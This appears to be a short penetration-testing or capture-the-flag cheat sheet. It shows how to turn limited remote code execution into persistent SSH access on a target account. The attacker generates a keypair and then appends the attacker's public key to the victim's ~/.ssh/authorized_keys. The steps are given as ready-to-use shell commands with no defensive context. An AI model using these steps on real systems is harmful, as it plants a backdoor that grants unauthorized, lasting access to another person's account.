##### Requirements:
limited RCE (file-write, mkdir, chmod, pwd) on target user capable of SSH.

Private id_rsa (attacker)
id_rsa.pub (attacker)

##### Obtain id_rsa files
On the attacking machine, use `ssh-keygen`
```
ssh-keygen // Input a path that won't collide with your files, empty passphrase
chmod 600 id_rsa // Make id_rsa usable
```

##### Exploitation
Move your `id_rsa.pub` to `/home/USER/.ssh`
```
cd /home/USER/.ssh  // If the .ssh directory does not exist, create it.
echo "ID_PUB_CONTENT" >> authorized_keys
chmod 600 authorized_keys
```